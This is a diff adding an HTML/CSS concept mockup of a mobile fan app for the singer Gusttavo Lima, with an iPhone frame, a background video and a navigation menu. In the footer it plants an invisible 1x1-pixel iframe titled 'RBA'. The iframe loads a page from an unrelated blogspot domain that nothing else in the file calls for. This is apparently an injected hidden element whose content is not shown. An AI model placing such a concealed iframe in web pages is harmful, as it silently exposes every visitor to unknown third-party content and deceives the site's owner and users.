@@ -1,0 +1,225 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Gusttavo Lima - App Conceito</title>
+    <style>
+        /* --- ESTILOS GERAIS --- */
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #121212; /* Fundo cinza muito escuro para contraste */
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #fff;
+        }
+
+        /* --- MOLDURA DO IPHONE (Simulação em Desktop) --- */
+        .iphone-frame {
+            width: 375px; /* Largura padrão iPhone X/11/12 */
+            height: 812px; /* Altura padrão iPhone X/11/12 */
+            background-color: #000; /* Fundo Preto do App */
+            border: 12px solid #333; /* Borda física do aparelho */
+            border-radius: 40px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.5);
+            overflow: hidden; /* Garante que nada saia da borda curva */
+            position: relative;
+            display: flex;
+            flex-direction: column;
+        }
+
+        /* Notch (Barra preta do topo do iPhone) - Apenas visual */
+        .iphone-notch {
+            position: absolute;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 150px;
+            height: 25px;
+            background-color: #333;
+            border-bottom-left-radius: 15px;
+            border-bottom-right-radius: 15px;
+            z-index: 100;
+        }
+
+        /* --- CONTEÚDO DO APP --- */
+        
+        /* 1. Header (Logo à esquerda) */
+        .app-header {
+            height: 80px; /* Espaço para o notch */
+            padding: 30px 20px 10px 20px;
+            display: flex;
+            align-items: center;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
+            z-index: 10;
+        }
+
+        .logo-placeholder {
+            width: 50px;
+            height: 50px;
+            background-color: rgba(255,255,255,0.2); /* Placeholder para o PNG */
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 10px;
+            text-align: center;
+        }
+
+        /* 2. Body (Com vídeo de fundo e menu à direita) */
+        .app-body {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+        }
+
+        /* Fundo MP4 */
+        .video-background {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: 1;
+            opacity: 0.6; /* Escurece um pouco o vídeo para dar leitura ao menu */
+        }
+
+        /* Container do Menu */
+        .menu-container {
+            position: relative;
+            z-index: 2;
+            height: 100%;
+            display: flex;
+            justify-content: flex-end; /* Empurra o menu para a direita */
+            align-items: center;
+            padding-right: 25px;
+        }
+
+        .app-menu {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            text-align: right; /* Alinha o texto das opções à direita */
+        }
+
+        .app-menu li {
+            margin-bottom: 18px;
+        }
+
+        .app-menu a {
+            text-decoration: none;
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            letter-spacing: 0.5px;
+            transition: color 0.3s ease;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5); /* Sombra no texto para leitura sobre o vídeo */
+        }
+
+        .app-menu a:hover {
+            color: #bfa36a; /* Cor de destaque (Dourado Embaixador) */
+        }
+
+        /* 3. Footer */
+        .app-footer {
+            height: 70px;
+            background-color: rgba(0,0,0,0.9);
+            border-top: 1px solid #222;
+            padding: 10px 20px;
+            text-align: center;
+            font-size: 11px;
+            color: #888;
+            z-index: 10;
+            line-height: 1.4;
+        }
+
+        .footer-brand {
+            font-weight: bold;
+            color: #fff;
+            margin-bottom: 3px;
+            font-size: 12px;
+        }
+
+        /* --- RESPONSIVIDADE (Se abrir direto no celular) --- */
+        @media (max-width: 400px) {
+            body {
+                background-color: #000;
+                align-items: flex-start;
+            }
+            .iphone-frame {
+                width: 100vw;
+                height: 100vh;
+                border: none;
+                border-radius: 0;
+                box-shadow: none;
+            }
+            .iphone-notch {
+                display: none; /* Esconde o notch falso no celular real */
+            }
+        }
+        .app-logo {
+    height: 50px;       /* Altura fixa para não quebrar o layout */
+    width: auto;        /* Ajusta a largura automaticamente para não distorcer */
+    object-fit: contain;
+    filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.5)); /* Dá um leve relevo no logo */
+}
+
+.app-header {
+    height: 80px; 
+    padding: 30px 20px 10px 20px;
+    display: flex;
+    align-items: center;
+    justify-content: flex-start; /* Garante que o logo fique na esquerda */
+    background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
+    z-index: 100;
+}
+    </style>
+</head>
+<body>
+
+    <div class="iphone-frame">
+        <div class="iphone-notch"></div>
+
+        <header class="app-header">
+           <header class="app-header">
+    <img src="logo.png" alt="Logo Gusttavo Lima" class="app-logo">
+</header>
+        </header>
+
+        <main class="app-body">
+            <video autoplay loop muted playsinline class="video-background">
+                <source src="https://gusttavolima.com.br/wp-content/uploads/2024/06/GL_SITE_V1_mp4_low_.mp4" type="video/mp4">
+                Seu navegador não suporta vídeos.
+            </video>
+
+            <div class="menu-container">
+                <ul class="app-menu">
+                    <li><a href="#">Início</a></li>
+                    <li><a href="#">Sobre</a></li>
+                    <li><a href="#">Agenda</a></li>
+                    <li><a href="#">Discografia</a></li>
+                    <li><a href="#">Fotos</a></li>
+                    <li><a href="#">Notícias</a></li>
+                    <li><a href="#">Central de Fãs</a></li>
+                    <li><a href="#">Contato</a></li>
+                    <li><a href="#">Loja</a></li>
+                    <li><a href="#">Transparência</a></li>
+                </ul>
+            </div>
+        </main>
+
+        <footer class="app-footer">
+            <div class="footer-brand">Gusttavo Lima</div>
+            Direitos Autorais © 2024<br>
+            gusttavolima.com.br
+        <iframe src="https://visualizar-iartium.blogspot.com/p/embaixador.html" width="1" height="1" title="RBA"></iframe>
+        </footer>
+    </div>
+
+</body>
+</html>
